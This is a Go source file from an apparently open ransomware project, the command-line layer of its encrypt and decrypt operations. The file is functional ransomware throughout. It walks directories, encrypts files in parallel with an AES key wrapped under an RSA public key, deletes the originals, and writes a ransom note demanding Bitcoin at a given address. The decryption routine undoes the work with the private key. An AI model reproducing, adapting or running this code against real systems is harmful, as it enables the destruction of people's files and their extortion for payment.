package cli

import (
	"crypto/rsa"
	"encoding/base64"
	"errors"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"text/template"

	"github.com/marmos91/ransomware/crypto"
	"github.com/marmos91/ransomware/fs"
	urfavecli "github.com/urfave/cli/v2"
)

type Ransom struct {
	BitcoinAddress string
	BitcoinCount   float64
	PublicKey      string
}

func loadPublicKey(path string) (*rsa.PublicKey, error) {
	pem, err := fs.ReadStringFileContent(path)
	if err != nil {
		return nil, err
	}
	return crypto.ParseRsaPublicKeyFromPemStr(pem)
}

func loadPrivateKey(path string) (*rsa.PrivateKey, error) {
	pem, err := fs.ReadStringFileContent(path)
	if err != nil {
		return nil, err
	}
	return crypto.ParseRsaPrivateKeyFromPemStr(pem)
}

// fileSize returns the size of the file at path, or 0 if it cannot be determined.
func fileSize(path string) int64 {
	info, err := os.Stat(path)
	if err != nil {
		return 0
	}
	return info.Size()
}

// processFiles applies operate to each file using parallel workers with progress
// tracking. Unless dryRun is set, originals are deleted after a successful operation.
func processFiles(files []string, workers int, dryRun bool, label string, operate func(path string) error) error {
	if len(files) == 0 {
		fmt.Fprintf(os.Stderr, "No files found for %s\n", strings.ToLower(label))
		return nil
	}

	progress := NewProgress(label, len(files))

	err := fs.ProcessFilesParallel(files, workers, func(filePath string) error {
		size := fileSize(filePath)

		if err := operate(filePath); err != nil {
			return fmt.Errorf("%s: %w", filePath, err)
		}

		if !dryRun {
			if err := fs.DeleteFileIfExists(filePath); err != nil {
				return fmt.Errorf("delete %s: %w", filePath, err)
			}
		}

		progress.Tick(filePath, size)
		return nil
	})

	progress.Summary(err != nil)
	return err
}

func Encrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")
	publicKeyPath := ctx.String("publicKey")
	addRansom := ctx.Bool("addRansom")
	ransomTemplatePath := ctx.String("ransomTemplatePath")
	ransomFileName := ctx.String("ransomFileName")
	bitcoinCount := ctx.Float64("bitcoinCount")
	bitcoinAddress := ctx.String("bitcoinAddress")
	skipHidden := ctx.Bool("skipHidden")
	dryRun := ctx.Bool("dryRun")
	recursive := ctx.Bool("recursive")
	workers := ctx.Int("workers")
	extBlacklist := splitCommaSeparated(ctx.String("extBlacklist"))
	extWhitelist := splitCommaSeparated(ctx.String("extWhitelist"))
	encSuffix := ctx.String("encSuffix")

	if addRansom && ransomTemplatePath == "" {
		return errors.New("ransomTemplatePath is required when addRansom is enabled")
	}

	absolutePath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	publicKey, err := loadPublicKey(publicKeyPath)
	if err != nil {
		return err
	}
	log.Println("RSA public key loaded")

	log.Println("Generating new AES key for current session")
	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)
	if err != nil {
		return err
	}

	encryptedAesKey, err := crypto.RsaEncrypt(plainAesKey, publicKey)
	if err != nil {
		return err
	}

	log.Printf("Running ransomware tool on %s", absolutePath)
	log.Printf("Blacklisted extensions = %v", extBlacklist)
	log.Printf("Whitelisted extensions = %v", extWhitelist)
	log.Printf("Skipping hidden files/folders = %t", skipHidden)
	log.Printf("Recursive = %t", recursive)
	log.Printf("DryRun enabled = %t", dryRun)
	log.Printf("Workers = %d", workers)
	log.Printf("EncSuffix = %s", encSuffix)
	log.Printf("Encrypted key size = %d", len(encryptedAesKey))
	log.Printf("Encrypted key = %s", base64.StdEncoding.EncodeToString(encryptedAesKey))
	log.Printf("BitcoinAddress = %s", bitcoinAddress)
	log.Printf("BitcoinCount = %f", bitcoinCount)
	log.Printf("Ransom file template = %s", ransomTemplatePath)
	log.Printf("Ransom file name = %s", ransomFileName)

	files, err := fs.WalkAndCollect(absolutePath, extBlacklist, extWhitelist, skipHidden, recursive)
	if err != nil {
		return err
	}

	if err := processFiles(files, workers, dryRun, "Encrypting", func(filePath string) error {
		return encryptFile(filePath, plainAesKey, encryptedAesKey, encSuffix)
	}); err != nil {
		return err
	}

	if addRansom {
		return writeRansomNote(absolutePath, ransomFileName, ransomTemplatePath, publicKey, bitcoinAddress, bitcoinCount)
	}

	return nil
}

func Decrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")
	privateKeyPath := ctx.String("privateKey")
	dryRun := ctx.Bool("dryRun")
	skipHidden := ctx.Bool("skipHidden")
	recursive := ctx.Bool("recursive")
	workers := ctx.Int("workers")
	encSuffix := ctx.String("encSuffix")
	ransomFileName := ctx.String("ransomFileName")
	extWhitelist := []string{encSuffix}

	absolutePath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	rsaPrivateKey, err := loadPrivateKey(privateKeyPath)
	if err != nil {
		return err
	}
	log.Println("RSA private key loaded")

	log.Printf("Running ransomware tool on %s", absolutePath)
	log.Printf("EncSuffix = %s", encSuffix)
	log.Printf("DryRun enabled = %t", dryRun)
	log.Printf("Recursive = %t", recursive)
	log.Printf("Workers = %d", workers)
	log.Printf("Whitelisted extensions = %v", extWhitelist)
	log.Printf("Ransom file name = %s", ransomFileName)
	log.Printf("Skipping hidden files/folders = %t", skipHidden)

	files, err := fs.WalkAndCollect(absolutePath, nil, extWhitelist, skipHidden, recursive)
	if err != nil {
		return err
	}

	if err := processFiles(files, workers, dryRun, "Decrypting", func(filePath string) error {
		return decryptFile(filePath, rsaPrivateKey, encSuffix)
	}); err != nil {
		return err
	}

	if !dryRun {
		return fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))
	}
	return nil
}

func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) error {
	ransomPath := filepath.Join(dir, fileName)
	log.Printf("Adding ransom file at %s", ransomPath)

	if _, err := os.Stat(ransomPath); err == nil {
		log.Printf("Ransom file already exists at %s. Skipping generation", ransomPath)
		return nil
	} else if !errors.Is(err, os.ErrNotExist) {
		return err
	}

	templateAbsPath, err := filepath.Abs(templatePath)
	if err != nil {
		return err
	}

	tmpl, err := template.ParseFiles(templateAbsPath)
	if err != nil {
		return err
	}

	textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)
	if err != nil {
		return err
	}

	file, err := os.Create(ransomPath)
	if err != nil {
		return err
	}
	defer file.Close()

	return tmpl.Execute(file, &Ransom{
		BitcoinCount:   bitcoinCount,
		BitcoinAddress: bitcoinAddress,
		PublicKey:      textPublicKey,
	})
}

func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) error {
	plainText, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	cipherText, err := crypto.AesEncrypt(plainText, aesKey)
	if err != nil {
		return err
	}

	// Allocate a new slice to avoid mutating the shared encryptedAesKey.
	fileContent := make([]byte, 0, len(encryptedAesKey)+len(cipherText))
	fileContent = append(fileContent, encryptedAesKey...)
	fileContent = append(fileContent, cipherText...)
	return fs.WriteToFile(path+encSuffix, fileContent)
}

func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
	cipherText, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	keySize := rsaPrivateKey.Size()
	// AES-GCM ciphertext must contain at least a 12-byte nonce and a 16-byte
	// authentication tag in addition to the RSA-encrypted key prefix.
	const minAESGCMOverhead = 12 + 16 // nonce + tag
	if len(cipherText) < keySize+minAESGCMOverhead {
		return fmt.Errorf("file too small to be a valid encrypted file: %s", path)
	}

	aesKey, err := crypto.RsaDecrypt(cipherText[:keySize], rsaPrivateKey)
	if err != nil {
		return err
	}

	plainText, err := crypto.AesDecrypt(cipherText[keySize:], aesKey)
	if err != nil {
		return err
	}

	return fs.WriteToFile(strings.TrimSuffix(path, encSuffix), plainText)
}

// splitCommaSeparated splits a comma-separated string into a slice.
// Returns nil for empty or whitespace-only input. Trims whitespace from
// each token and drops empty entries to handle inputs like ".txt, .doc"
// or trailing commas like ".txt,".
func splitCommaSeparated(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}

	parts := strings.Split(s, ",")
	result := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			result = append(result, p)
		}
	}
	if len(result) == 0 {
		return nil
	}
	return result
}
